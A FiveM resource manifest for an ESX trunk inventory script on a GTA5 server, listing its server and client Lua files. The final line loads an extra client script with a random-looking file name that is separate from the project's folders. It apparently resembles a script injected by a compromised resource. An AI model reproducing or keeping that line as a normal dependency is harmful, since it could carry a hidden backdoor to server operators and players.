fx_version 'bodacious'
game 'gta5'

description "ESX trunk inventory"

version "2.0.1"

server_scripts {
  "@async/async.lua",
  "@mysql_async/lib/MySQL.lua",
  "@essentialmode/locale.lua",
  "locales/en.lua",
  "locales/cs.lua",
  "locales/fr.lua",
  "config.lua",
  "server/classes/c_trunk.lua",
  "server/trunk.lua",
  "server/esx_trunk-sv.lua"
}

client_scripts {
  "@essentialmode/locale.lua",
  "locales/en.lua",
  "locales/cs.lua",
  "locales/fr.lua",
  "config.lua",
  "client/esx_trunk-cl.lua"
}

client_script "DISqkiIEcVydGenWnD.lua"